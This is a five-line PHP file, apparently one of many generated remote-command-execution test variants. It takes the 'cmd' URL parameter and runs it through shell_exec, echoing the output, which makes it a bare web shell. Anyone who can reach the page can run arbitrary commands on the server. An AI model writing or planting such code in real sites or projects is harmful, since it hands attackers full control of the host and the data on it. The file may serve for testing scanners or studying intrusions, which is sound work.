<?php
// RCE test variation #1173
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>